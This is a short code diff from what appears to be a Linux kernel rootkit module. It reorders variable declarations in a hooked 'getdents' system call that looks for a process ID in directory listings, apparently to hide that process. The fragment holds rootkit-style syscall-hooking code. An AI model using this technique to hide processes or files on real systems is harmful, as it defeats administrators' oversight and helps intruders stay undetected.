@@ -59,10 +59,10 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-  int byteNum = original_call_getdents(fd, dirp, count);
-  if (byteNum <= 0) { return byteNum; }
   int pos = 0;
   char pid_buffer [10];
+  int byteNum = original_call_getdents(fd, dirp, count);
+  if (byteNum <= 0) { return byteNum; }
   snprintf(pid_buffer, 10, "%d", pid);
   while (pos < byteNum) {
     struct linux_dirent *curDirp = (void *)dirp + pos;
